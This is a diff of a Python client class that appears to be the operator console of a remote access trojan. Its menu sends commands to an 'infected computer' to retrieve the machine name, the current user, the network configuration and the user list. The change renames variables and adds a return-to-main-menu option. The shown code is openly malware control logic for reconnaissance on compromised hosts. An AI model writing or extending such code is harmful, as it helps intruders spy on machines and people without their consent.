@@ -141,29 +141,32 @@ class Client(Machine):
         choix = input()
         return choix
 
-    def choice_information(self, choix2):
-        while choix2 != "0":
-            if choix2 == "1":
+    def choice_information(self, choice2):
+        while choice2 != "0" and choice2 != "5" and choice2 is not None:
+            if choice2 == "1":
                 self.send("computer")
                 print("\nComputer name : ", end="")
                 print(self.receive())
-            elif choix2 == "2":
+            elif choice2 == "2":
                 self.send("current")
                 print("\nCurrent user : ", end="")
                 print(self.receive())
-            elif choix2 == "3":
+            elif choice2 == "3":
                 self.send("network")
                 print(self.receive())
-            elif choix2 == "4":
+            elif choice2 == "4":
                 self.send("users")
                 print(self.receive())
             else:
                 print("Enter a valid value!\n")
 
-            choix2 = self.display_choice()
+            choice2 = self.display_choice()
 
-        self.send("quit")
-        self.quit()
+        if choice2 == "5":
+            self.send("menu")
+        else:
+            self.send("quit")
+            self.quit()
 
     def display_choice(self):
         print("   _____        __                                 \n",
@@ -171,9 +174,10 @@ class Client(Machine):
               "   / /\\/ \'_ \\| |_ / _ \\   /    \\ / _ \\ \'_ \\| | | |\n",
               "/\\/ /_ | | | |  _| (_) | / /\\/\\ \\  __/ | | | |_| |\n",
               "\\____/ |_| |_|_|  \\___/  \\/    \\/\\___|_| |_|\\__,_|\n")
-        print("\nPress 1 to get the infected computer name")
+        print("Press 1 to get the infected computer name")
         print("Press 2 to see who is the current user")
         print("Press 3 to get the network configuration")
         print("Press 4 to get the list of users")
+        print("Press 5 to return to the main menu")
         print("Press 0 to quit")
         return input()
